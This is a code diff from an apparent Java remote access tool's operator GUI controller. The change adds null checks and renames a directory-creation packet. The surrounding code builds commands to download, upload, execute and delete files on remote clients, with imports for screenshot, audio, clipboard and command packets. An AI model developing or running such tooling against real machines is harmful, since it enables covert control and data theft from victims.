@@ -30,7 +30,6 @@ import de.sogomn.rat.packet.AudioPacket;
 import de.sogomn.rat.packet.ChatPacket;
 import de.sogomn.rat.packet.ClipboardPacket;
 import de.sogomn.rat.packet.CommandPacket;
-import de.sogomn.rat.packet.CreateDirectoryPacket;
 import de.sogomn.rat.packet.DeleteFilePacket;
 import de.sogomn.rat.packet.DesktopPacket;
 import de.sogomn.rat.packet.DownloadFilePacket;
@@ -41,6 +40,7 @@ import de.sogomn.rat.packet.FileRequestPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
+import de.sogomn.rat.packet.NewDirectoryPacket;
 import de.sogomn.rat.packet.PingPacket;
 import de.sogomn.rat.packet.PopupPacket;
 import de.sogomn.rat.packet.ScreenshotPacket;
@@ -201,6 +201,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private DownloadFilePacket createDownloadPacket(final ServerClient client) {
 		final FileTreeNode node = client.fileTree.getNodeClicked();
+		
+		if (node == null) {
+			return null;
+		}
+		
 		final String path = node.getPath();
 		final DownloadFilePacket packet = new DownloadFilePacket(path);
 		
@@ -208,10 +213,15 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private UploadFilePacket createUploadPacket(final ServerClient client) {
+		final FileTreeNode node = client.fileTree.getNodeClicked();
+		
+		if (node == null) {
+			return null;
+		}
+		
 		final File file = gui.getFile();
 		
 		if (file != null) {
-			final FileTreeNode node = client.fileTree.getNodeClicked();
 			final String path = node.getPath();
 			final UploadFilePacket packet = new UploadFilePacket(file, path);
 			
@@ -223,6 +233,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private ExecuteFilePacket createExecutePacket(final ServerClient client) {
 		final FileTreeNode node = client.fileTree.getNodeClicked();
+		
+		if (node == null) {
+			return null;
+		}
+		
 		final String path = node.getPath();
 		final ExecuteFilePacket packet = new ExecuteFilePacket(path);
 		
@@ -231,19 +246,29 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private DeleteFilePacket createDeletePacket(final ServerClient client) {
 		final FileTreeNode node = client.fileTree.getNodeClicked();
+		
+		if (node == null) {
+			return null;
+		}
+		
 		final String path = node.getPath();
 		final DeleteFilePacket packet = new DeleteFilePacket(path);
 		
 		return packet;
 	}
 	
-	private CreateDirectoryPacket createFolderPacket(final ServerClient client) {
+	private NewDirectoryPacket createDirectoryPacket(final ServerClient client) {
+		final FileTreeNode node = client.fileTree.getNodeClicked();
+		
+		if (node == null) {
+			return null;
+		}
+		
 		final String input = gui.getInput();
 		
 		if (input != null) {
-			final FileTreeNode node = client.fileTree.getNodeClicked();
 			final String path = node.getPath();
-			final CreateDirectoryPacket packet = new CreateDirectoryPacket(path, input);
+			final NewDirectoryPacket packet = new NewDirectoryPacket(path, input);
 			
 			return packet;
 		}
@@ -279,6 +304,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private FileInformationPacket createFileInformationPacket(final ServerClient client) {
 		final FileTreeNode node = client.fileTree.getNodeClicked();
+		
+		if (node == null) {
+			return null;
+		}
+		
 		final String path = node.getPath();
 		final FileInformationPacket packet = new FileInformationPacket(path);
 		
@@ -337,6 +367,11 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private void requestFile(final ServerClient client) {
 		final FileTreeNode node = client.fileTree.getNodeClicked();
+		
+		if (node == null) {
+			return;
+		}
+		
 		final String path = node.getPath();
 		final FileRequestPacket packet = new FileRequestPacket(path);
 		
@@ -441,7 +476,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		} else if (command == FileTree.DELETE) {
 			packet = createDeletePacket(client);
 		} else if (command == FileTree.NEW_DIRECTORY) {
-			packet = createFolderPacket(client);
+			packet = createDirectoryPacket(client);
 		} else if (command == FileTree.DROP_FILE) {
 			packet = createDownloadUrlPacket(client);
 		} else if (command == RattyGui.UPLOAD_EXECUTE) {
